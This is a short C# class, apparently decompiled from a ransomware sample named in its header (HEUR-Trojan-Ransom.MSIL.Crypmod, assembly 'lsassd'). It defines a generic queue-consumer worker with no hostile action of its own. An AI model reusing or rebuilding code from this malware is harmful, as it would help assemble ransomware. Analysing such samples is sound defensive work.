// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.AbstractConsumer`1
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using System;
using System.Collections.Concurrent;

namespace MOISHE.Core
{
  public abstract class AbstractConsumer<T> : AbstractWorker
  {
    protected BlockingCollection<T> source;

    protected AbstractConsumer(BlockingCollection<T> source) => this.source = source;

    protected override void Execute()
    {
      while (this._run)
      {
        try
        {
          T obj = this.source.Take();
          if ((object) obj != null)
            this.OnItemArrived(obj);
        }
        catch (Exception ex)
        {
        }
      }
    }

    protected abstract void OnItemArrived(T item);
  }
}
